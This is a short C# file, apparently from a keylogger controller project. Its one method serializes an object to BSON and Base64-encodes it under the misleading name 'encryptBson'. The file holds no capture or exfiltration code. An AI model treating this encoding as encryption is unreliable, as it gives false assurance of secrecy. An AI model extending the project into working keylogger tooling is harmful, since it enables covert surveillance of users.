using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Bson;

namespace KeyloggerController
{
    class classGetEncryption
    {
        public static string encryptBson(classJsonObj.classJson objJson)
        {
            MemoryStream ms = new MemoryStream();
            using (BsonWriter writer = new BsonWriter(ms))
            {
                JsonSerializer serializer = new JsonSerializer();
                serializer.Serialize(writer, objJson);
            }

            string data = Convert.ToBase64String(ms.ToArray());

            return data;
        }
    }
}
